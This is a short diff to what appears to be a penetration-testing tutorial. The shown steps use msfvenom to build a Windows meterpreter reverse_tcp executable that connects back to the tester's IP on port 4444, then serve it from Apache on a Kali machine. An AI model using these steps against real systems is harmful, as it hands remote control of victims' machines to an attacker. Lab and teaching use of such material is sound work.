@@ -9,9 +9,9 @@ $ "msfvenom -p windows/meterpreter/reverse_tcp LHOST={your-local-IP-address}
 LPORT=4444 --format=exe > {filename}.exe"
 ** Your local IP address can be found by $ ifconfig
 
-- Copy the file to the Apache web server directory
+- Copy the file to the default root folder of the Apache web server
 $ cp {filename}.exe /var/www/html
-Makes the file accessible via a web server hosten on your Kali machine.
+Makes the file accessible via a web server hosting on your Kali machine.
 
 - Start the Apache web server using:
 $ service apache2 start
